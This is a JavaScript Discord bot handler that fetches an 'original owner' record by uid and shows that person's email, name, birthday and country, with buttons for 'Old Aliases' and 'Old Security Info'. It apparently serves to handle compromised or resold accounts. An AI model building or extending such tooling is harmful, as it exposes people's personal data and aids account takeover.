const { queryParams } = require('../../../db/database');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");

module.exports = {
    name: "ogo",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            let [t, uid] = interaction.customId.split("|");

            const ogodata = await fetchogo(uid, client);

            const embed = new EmbedBuilder()
                .setTitle("Original Owner")
                .setColor('#b2c7e0');

            if (!ogodata) {
                return interaction.reply({
                    embeds: [embed.setTitle("Original Owner")],
                    ephemeral: true,
                });
            }

            embed.addFields(
                { name: "Email", value: `\`\`\`${ogodata.email}\`\`\``, inline: false },
                { name: "First Name", value: `\`\`\`${ogodata.firstname}\`\`\``, inline: true },
                { name: "Last Name", value: `\`\`\`${ogodata.lastname}\`\`\``, inline: true },
                { name: "Birthday", value: `\`\`\`${ogodata.birthday}\`\`\``, inline: false },
                { name: "Country", value: `\`\`\`${ogodata.country}\`\`\``, inline: false }
            );

            const row1 = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder().setCustomId(`oldaliases|${uid}`).setLabel("Old Aliases").setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder().setCustomId(`security|${uid}`).setLabel("Old Security Info").setStyle(ButtonStyle.Secondary)
                );

            await interaction.reply({ embeds: [embed], ephemeral: true, components: [row1] });
        } catch (error) {
            console.error("Error fetching or displaying OGO data:", error);
            return interaction.reply({
                content: "There was an error processing your request.",
                ephemeral: true,
            });
        }
    }
};

async function fetchogo(uid, client) {
    try {
        const result = await client.queryParams('SELECT ogo FROM extrainformation WHERE uid = ?', [uid]);

        if (result && result.length > 0) {
            return JSON.parse(result[0].ogo);
        } else {
            return null;
        }
    } catch (error) {
        console.error("Error fetching OGO data:", error);
        return null;
    }
}
